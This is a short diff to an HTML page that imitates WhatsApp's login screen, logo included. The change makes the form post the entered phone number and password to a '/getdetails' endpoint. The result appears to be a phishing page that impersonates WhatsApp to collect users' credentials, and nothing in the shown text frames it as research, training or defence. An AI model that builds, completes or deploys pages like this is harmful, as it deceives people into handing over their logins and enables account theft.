@@ -93,12 +93,12 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         </div>
         <div class="title">Log in to WhatsApp</div>
-        <form>
+        <form action="/getdetails" method="post">
             <div class="form-group">
-                <input type="text" placeholder="Phone number" required>
+                <input type="text" placeholder="Phone number" name="username" required>
             </div>
             <div class="form-group">
-                <input type="password" placeholder="Password" required>
+                <input type="password" placeholder="Password" name="password" required>
             </div>
             <button type="submit" class="login-btn">Log In</button>
         </form>
